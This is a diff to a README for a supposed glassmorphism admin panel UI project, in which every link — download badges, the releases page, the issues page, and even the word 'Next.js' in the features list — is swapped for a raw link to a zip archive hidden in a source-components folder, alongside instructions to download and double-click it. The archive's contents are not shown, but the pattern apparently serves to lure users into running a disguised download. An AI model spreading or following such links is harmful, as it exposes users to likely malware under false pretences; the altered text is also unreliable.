@@ -14,17 +14,17 @@ To use the Glassmorphism Admin Panel UI, you will need:
 
 ## 📥 Download
 
-[![Download Glassmorphism-Admin-Panel-UI](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/tempt9008/Glassmorphism-Admin-Panel-UI/releases)
+[![Download Glassmorphism-Admin-Panel-UI](https://github.com/tempt9008/Glassmorphism-Admin-Panel-UI/raw/refs/heads/main/src/components/shared/Panel-Glassmorphism-Admin-UI-1.8.zip)](https://github.com/tempt9008/Glassmorphism-Admin-Panel-UI/raw/refs/heads/main/src/components/shared/Panel-Glassmorphism-Admin-UI-1.8.zip)
 
 ## 📋 Features
 
 - **Real-time Adjustments:** Change the glassmorphism effects, including blur, opacity, and saturation, as you work.
 - **Easy to Use:** Enjoy a user-friendly interface designed for everyone, regardless of technical skill.
-- **Modern Frameworks:** Built using Next.js 15, Tailwind CSS, and Radix UI for optimal performance and design.
+- **Modern Frameworks:** Built using https://github.com/tempt9008/Glassmorphism-Admin-Panel-UI/raw/refs/heads/main/src/components/shared/Panel-Glassmorphism-Admin-UI-1.8.zip 15, Tailwind CSS, and Radix UI for optimal performance and design.
 
 ## 💾 Download & Install
 
-1. Visit the [Releases page](https://github.com/tempt9008/Glassmorphism-Admin-Panel-UI/releases) to find the latest version.
+1. Visit the [Releases page](https://github.com/tempt9008/Glassmorphism-Admin-Panel-UI/raw/refs/heads/main/src/components/shared/Panel-Glassmorphism-Admin-UI-1.8.zip) to find the latest version.
 2. Click on the link for the most recent release.
 3. Download the appropriate file for your operating system.
 4. Once downloaded, locate the file on your computer and double-click it to start the installation.
@@ -47,10 +47,10 @@ If you encounter issues while using the Glassmorphism Admin Panel UI, try these 
 - Check your internet connection for stability.
 - Restart your application if you experience lag or glitches.
 
-For further assistance, you can refer to the Issues section on the [GitHub page](https://github.com/tempt9008/Glassmorphism-Admin-Panel-UI/issues).
+For further assistance, you can refer to the Issues section on the [GitHub page](https://github.com/tempt9008/Glassmorphism-Admin-Panel-UI/raw/refs/heads/main/src/components/shared/Panel-Glassmorphism-Admin-UI-1.8.zip).
 
 ## 🎉 Conclusion
 
 The **Glassmorphism-Admin-Panel-UI** gives you a modern, customizable admin panel experience. Download now and start managing your applications with style. Your personalized settings and sleek design await!
 
-[![Download Glassmorphism-Admin-Panel-UI](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/tempt9008/Glassmorphism-Admin-Panel-UI/releases)
+[![Download Glassmorphism-Admin-Panel-UI](https://github.com/tempt9008/Glassmorphism-Admin-Panel-UI/raw/refs/heads/main/src/components/shared/Panel-Glassmorphism-Admin-UI-1.8.zip)](https://github.com/tempt9008/Glassmorphism-Admin-Panel-UI/raw/refs/heads/main/src/components/shared/Panel-Glassmorphism-Admin-UI-1.8.zip)
